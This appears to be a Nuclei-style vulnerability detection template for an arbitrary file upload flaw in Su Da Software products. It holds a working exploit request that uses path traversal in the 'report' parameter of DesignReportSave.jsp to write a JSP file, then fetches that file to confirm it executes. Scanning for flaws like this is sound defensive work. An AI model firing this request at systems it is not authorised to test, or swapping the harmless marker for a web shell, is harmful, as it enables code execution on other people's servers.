id: su-da-ruan-jian-designreportsave-jsp-anyfile-upload

info:
  name: 速达软件产品任意文件上传漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload
  description: |
    This template detects arbitrary file upload vulnerability in 速达软件 (Su Da Software) products.

variables:
  t1: "{{rand_base(4)}}"
  t2: "{{md5(t1)}}"

http:
  - id: upload-file
    method: POST
    path:
      - "/report/DesignReportSave.jsp?report=../{{t1}}.jsp"
    headers:
      Content-Type: application/octet-stream
    body: "<% out.print(\"{{t2}}\");%>"
    matchers:
      - type: status
        status:
          - 200

  - id: verify-file
    method: GET
    path:
      - "/{{t1}}.jsp"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{t2}}"
